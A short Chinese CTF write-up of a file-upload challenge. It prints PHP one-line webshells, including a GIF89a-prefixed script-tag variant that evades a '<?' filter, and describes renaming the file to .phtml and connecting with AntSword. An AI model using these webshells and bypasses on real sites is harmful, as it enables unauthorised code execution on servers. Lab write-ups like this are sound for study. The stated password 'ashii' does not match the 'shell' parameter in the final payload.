尝试成功让人感动流泪。其实木马什么的并不难，难的是怎么连接上中了webshell的网站。<br>

## 1

首先我们打开靶机就是一个普通的界面，上传文件。<br>
不过都极客大挑战了，再上传什么php，js就有点睿智了，所以一上来用png或者gif或者more others。
一句话木马：
```php
<?php @eval($_POST['ashii']); ?>
```
传入文件后，毫不意外出现警告，`<?`被禁止。<br>
所以转个


```javascript
GIF89a
<script language='php'>eval($_POST['shell'])</script>
```

在抓包之后进行修改，将后缀'.png'修改成`.phtml`，forward。（或许可以尝试上传.taccess解析文件，尝试后再补充）<br>

界面显示上传成功后，我们尝试一下`xxx/upload/yyy.phtml`，界面如果显示了`GIF89a`，代表着访问成功。
接下来直接用该网址连接byAntSword，密码是`$_POST[]`的内容，此处为`ashii`。成功连接之后很容易可以找到flag文件。

## 2

一些补充材料：
<a href='https://www.solvusoft.com/zh-cn/file-extensions/file-extension-phtml/#'>什么是phtml</a>

<a href='https://zhuanlan.zhihu.com/p/138200793'>一句话木马</a>

<a href='https://www.cnblogs.com/linfangnan/p/13588709.html'>CTF-WEB简单参考</a>

<a href=https://blog.csdn.net/July_2th/article/details/84335572>webshell、木马、后门的区别</a>